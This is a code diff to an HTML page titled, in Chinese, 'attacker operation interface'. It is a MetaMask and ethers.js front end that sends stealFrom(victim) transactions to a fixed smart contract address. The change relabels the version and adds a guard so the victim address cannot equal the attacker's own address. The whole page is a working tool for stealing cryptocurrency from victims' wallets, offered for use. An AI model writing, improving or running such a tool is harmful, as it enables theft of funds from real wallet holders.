@@ -1,8 +1,9 @@
+
 <!DOCTYPE html>
 <html lang="zh-Hant">
 <head>
   <meta charset="UTF-8">
-  <title>🛠️ 攻擊者操作介面 v3.1.5（🔧除錯增強版）</title>
+  <title>🛠️ 攻擊者操作介面 v3.1.8（🚫防止自轉自）</title>
   <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
   <style>
     body { font-family: 'Arial'; padding: 20px; background: #fff; }
@@ -11,7 +12,7 @@
   </style>
 </head>
 <body>
-  <h2>🛠️ 攻擊者操作介面 v3.1.5（🔧除錯增強版）</h2>
+  <h2>🛠️ 攻擊者操作介面 v3.1.8（🚫防止自轉自）</h2>
   <p><b>合約地址：</b><span id="contract">0xFbe9c4748A267562f723C67db673943F901533D6</span></p>
   <p><b>目前登入帳號：</b><span id="account">MetaMask 連線中...</span></p>
   <p><b>身份驗證：</b><span id="auth" class="bad">尚未驗證</span></p>
@@ -71,6 +72,13 @@
       const victim = document.getElementById("input").value;
       const iface = new ethers.utils.Interface(["function stealFrom(address)"]);
       const data = iface.encodeFunctionData("stealFrom", [victim]);
+
+      const attacker = await signer.getAddress();
+      if (victim.toLowerCase() === attacker.toLowerCase()) {
+        document.getElementById("status").innerText = "❌ 錯誤：受害者地址不能與攻擊者相同";
+        return;
+      }
+
       const tx = { to: CONTRACT, data: data };
       document.getElementById("status").innerText = "🚀 呼叫 stealFrom(" + victim + ")...";
       try {
